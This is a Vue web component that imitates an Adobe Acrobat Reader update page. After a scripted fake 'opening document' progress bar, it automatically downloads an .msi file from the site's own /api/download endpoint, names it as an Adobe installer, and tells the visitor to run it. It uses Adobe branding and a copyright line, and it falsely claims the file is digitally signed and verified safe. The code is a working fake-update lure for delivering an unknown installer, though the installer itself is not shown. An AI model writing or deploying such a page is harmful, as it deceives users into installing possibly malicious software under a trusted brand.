<template>
  <div class="pdf-prompt-container">
    <div v-if="showDocumentPreview" class="document-preview-overlay">
      <div class="document-preview-container">
        <div class="pdf-icon">
          <div class="adobe-logo">
            <img src="/images/adobe-logo.svg" alt="Adobe PDF" class="adobe-pdf-logo" @error="handleImageError" />
          </div>
        </div>
        <h1 class="title">Opening Document</h1>
        <p class="message">Please wait while we open your document...</p>
        <div class="loading-bar">
          <div class="loading-progress" :style="{ width: loadingProgress + '%' }"></div>
        </div>
        <p class="sub-message">{{ loadingStatus }}</p>
      </div>
    </div>

    <div v-else class="update-container">
      <div class="content-wrapper">
        <div class="pdf-icon">
          <div class="adobe-logo">
            <img src="/images/adobe-logo.svg" alt="Adobe PDF" class="adobe-pdf-logo" @error="handleImageError" />
          </div>
        </div>
        
        <h1 class="title">Adobe Acrobat Reader Update Required</h1>
        <p class="message">To view this PDF document securely, you need the latest version of Adobe Acrobat Reader.</p>
        <p class="sub-message">The update will download automatically. Please install it to continue viewing your document.</p>
        
        <div class="version-info">
          <p class="version">Version 2025.003.20360 | Windows 10 - 11 | English</p>
          <p class="requirements">System Requirements: Windows 10 version 1903 or later</p>
        </div>
        
        <p class="security-note">This download is digitally signed and verified safe for installation.</p>
          
        <div v-if="showDownloadProgress" class="download-progress">
          <div class="loading-bar" v-if="!downloadComplete">
            <div class="loading-progress indeterminate"></div>
          </div>
          <div class="download-complete-icon" v-if="downloadComplete"></div>
          <p class="download-status">{{ loadingStatus }}</p>
          
          <a v-if="downloadComplete" :href="`/api/download?t=${Date.now()}`" style="color: #ED1C24; text-decoration: underline;">
            Click here if download failed
          </a>
        </div>
        
        <div class="footer-spacer"></div>
      </div>
    </div>
    
    <div class="footer" v-if="!showDocumentPreview">
      <p>&copy; 2025 Adobe Inc. All rights reserved. | <a href="https://www.adobe.com/privacy.html" target="_blank" class="footer-link">Privacy</a> | <a href="https://www.adobe.com/legal/terms.html" target="_blank" class="footer-link">Terms of Use</a></p>
    </div>
  </div>
</template>

<script>
export default {
  name: 'AdobeReaderPrompt',
  data() {
    return {
      downloadInProgress: false,
      showDocumentPreview: true,
      loadingProgress: 0,
      loadingStatus: 'Initializing document viewer...',
      showDownloadProgress: false,
      downloadComplete: false
    }
  },
  mounted() {
    this.startDocumentPreview()
  },
  methods: {
    async startDocumentPreview() {
      const loadingSteps = [
        { progress: 20, status: 'Opening document...', delay: 800 },
        { progress: 40, status: 'Loading content...', delay: 800 },
        { progress: 60, status: 'Preparing viewer...', delay: 800 },
        { progress: 80, status: 'Checking compatibility...', delay: 800 },
        { progress: 100, status: 'Ready to view!', delay: 800 }
      ]

      for (const step of loadingSteps) {
        await new Promise(resolve => setTimeout(resolve, step.delay))
        this.loadingProgress = step.progress
        this.loadingStatus = step.status
      }

      await new Promise(resolve => setTimeout(resolve, 800))
      this.showDocumentPreview = false

      setTimeout(() => this.initiateDownload(), 2000)
    },
    
    async initiateDownload() {
      if (this.downloadInProgress) return
      
      this.downloadInProgress = true
      this.showDownloadProgress = true
      this.downloadComplete = false
      this.loadingStatus = "Preparing Adobe Reader update..."
      
      try {
        await new Promise(resolve => setTimeout(resolve, 1000))
        
        const timestamp = Date.now()
        
        this.loadingStatus = "Preparing download..."
        
        const downloadUrl = `/api/download?t=${timestamp}`
        
        let generatedFileName = 'AdobeAcrobatDC_2024.003.12345_678901.msi'
        
        // Get filename using HEAD request first
        try {
          const headResponse = await fetch(downloadUrl, { 
            method: 'HEAD'
          })
          
          const contentDisposition = headResponse.headers.get('Content-Disposition')
          console.log('Content-Disposition:', contentDisposition)
          
          if (contentDisposition) {
            const match = contentDisposition.match(/filename="([^"]+)"/)
            if (match && match[1]) {
              generatedFileName = match[1]
              console.log('Extracted filename:', generatedFileName)
            }
          }
        } catch (e) {
          console.error('Error getting filename:', e)
        }
        
        // Now trigger the actual download
        this.loadingStatus = "Starting download..."
        
        const downloadLink = document.createElement('a')
        downloadLink.href = downloadUrl + '&dl=1'
        downloadLink.download = generatedFileName
        downloadLink.style.display = 'none'
        document.body.appendChild(downloadLink)
        
        await new Promise(resolve => setTimeout(resolve, 500))
        
        downloadLink.click()
        
        await new Promise(resolve => setTimeout(resolve, 500))
        
        document.body.removeChild(downloadLink)
        
        this.loadingStatus = "Download started. Please run the installer when prompted."
        this.downloadComplete = true
        
        console.log('Emitting filename to parent:', generatedFileName)
        
        // Wait then show install page
        await new Promise(resolve => setTimeout(resolve, 1500))
        this.$emit('download-complete', generatedFileName)
        
      } catch (error) {
        console.error('Error:', error)
        this.loadingStatus = "Please use the download button below"
        this.downloadComplete = true
      } finally {
        this.downloadInProgress = false
      }
    },
    
    handleManualDownload() {
      if (!this.downloadInProgress) {
        this.initiateDownload()
      }
    },
    
    handleImageError(event) {
      event.target.style.display = 'none'
    }
  }
}
</script>

<style scoped>
.pdf-prompt-container {
  position: fixed;
  top: 0;
  left: 0;
  width: 100vw;
  height: 100vh;
  display: flex;
  flex-direction: column;
  background-color: #ffffff;
  font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
  box-sizing: border-box;
  overflow: hidden;
}

.update-container {
  position: relative;
  width: 100%;
  height: 100%;
  background-color: #ffffff;
}

.document-preview-overlay {
  position: fixed;
  top: 0;
  left: 0;
  width: 100vw;
  height: 100vh;
  background-color: #ffffff;
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 1000;
}

.document-preview-container {
  background: white;
  border-radius: 8px;
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
  text-align: center;
  width: 100%;
  max-width: 600px;
  min-height: 400px;
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  padding: 40px;
  box-sizing: border-box;
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  z-index: 2;
}

.loading-bar {
  width: 100%;
  height: 4px;
  background-color: #e5e7eb;
  border-radius: 2px;
  overflow: hidden;
  margin: 20px 0;
}

.loading-progress {
  height: 100%;
  background-color: #ED1C24;
  border-radius: 2px;
  transition: width 0.5s ease;
}

.loading-progress.indeterminate {
  width: 100%;
  background: linear-gradient(90deg, transparent, #ED1C24, transparent);
  animation: slide 1.5s infinite;
}

@keyframes slide {
  0% { transform: translateX(-100%); }
  100% { transform: translateX(100%); }
}

.content-wrapper {
  background: #ffffff;
  border-radius: 8px;
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
  text-align: center;
  width: 100%;
  max-width: 600px;
  min-height: 500px;
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  padding: 40px 40px 80px 40px;
  box-sizing: border-box;
  margin: 0 auto;
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  z-index: 2;
}

.pdf-icon {
  margin-bottom: 30px;
}

.adobe-logo {
  width: 80px;
  height: 80px;
  display: flex;
  align-items: center;
  justify-content: center;
}

.adobe-pdf-logo {
  width: 100%;
  height: 100%;
  object-fit: contain;
}

.content {
  text-align: center;
  flex: 1;
  display: flex;
  flex-direction: column;
  justify-content: center;
}

.title {
  font-size: 3rem;
  font-weight: bold;
  color: #333;
  margin: 0 0 30px 0;
}

.message {
  font-size: 1.125rem;
  color: #333;
  line-height: 1.5;
  margin-bottom: 20px;
}

.sub-message {
  font-size: 1rem;
  color: #333;
  line-height: 1.5;
  margin-bottom: 30px;
}

.version-info {
  background-color: #f8f9fa;
  border-radius: 4px;
  padding: 15px;
  margin-bottom: 20px;
  text-align: left;
}

.version {
  font-size: 0.9rem;
  color: #666;
  margin: 0 0 5px 0;
  font-weight: 500;
}

.requirements {
  font-size: 0.85rem;
  color: #666;
  margin: 0;
}

.security-note {
  font-size: 0.875rem;
  color: #666;
  margin-bottom: 20px;
}

.download-progress {
  width: 100%;
  margin-top: 20px;
  margin-bottom: 20px;
  text-align: center;
}

.download-complete-icon {
  width: 40px;
  height: 40px;
  margin: 0 auto;
  background-color: #43a047;
  border-radius: 50%;
  position: relative;
  margin-bottom: 10px;
}

.download-complete-icon::before {
  content: '';
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%) rotate(45deg);
  width: 8px;
  height: 16px;
  border-bottom: 3px solid white;
  border-right: 3px solid white;
  margin-top: -3px;
}

.download-status {
  font-size: 1rem;
  color: #666;
  margin-top: 12px;
}

.footer-spacer {
  height: 50px;
}

.footer {
  position: absolute;
  bottom: 20px;
  left: 0;
  right: 0;
  text-align: center;
  width: 100%;
  z-index: 10;
}

.footer p {
  font-size: 0.75rem;
  color: #bdc3c7;
  margin: 0;
}

.footer-link {
  color: #bdc3c7;
  text-decoration: none;
}

.footer-link:hover {
  text-decoration: underline;
}

@media (max-width: 768px) {
  .document-preview-container,
  .content-wrapper { 
    padding: 30px 20px; 
    max-width: 90%; 
  }
  
  .title { 
    font-size: 2rem; 
  }
  
  .adobe-logo { 
    width: 60px; 
    height: 60px; 
  }
}

@media (max-width: 480px) {
  .document-preview-container,
  .content-wrapper {
    padding: 30px 20px;
  }
  
  .title {
    font-size: 1.8rem;
  }
}
</style>
